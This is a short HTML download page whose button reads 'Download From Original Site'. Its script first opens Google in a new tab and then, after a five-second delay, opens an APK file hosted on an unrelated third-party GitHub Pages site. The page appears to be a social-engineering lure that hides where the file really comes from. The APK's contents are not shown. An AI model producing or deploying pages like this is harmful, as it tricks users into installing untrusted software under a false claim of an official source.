<html>
 <head> 
  <meta charset="utf-8">
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
</style>
 </head> 
 <body>

<script>
function a() {
    // Buka Google di tab baru
    window.open('https://google.com/', '_blank');

    // Setelah 5 detik, buka URL berikutnya di tab baru
    setTimeout(function() {
        window.open(
            'https://weird0xsec.github.io/spf/comet.apk',
            '_blank'
        );
    }, 5000);
}
</script>

<center>
    <input
        type="button"
        class="button"
        value="Download From Original Site"
        onclick="a()"
    >
</center>

</body>

</html>
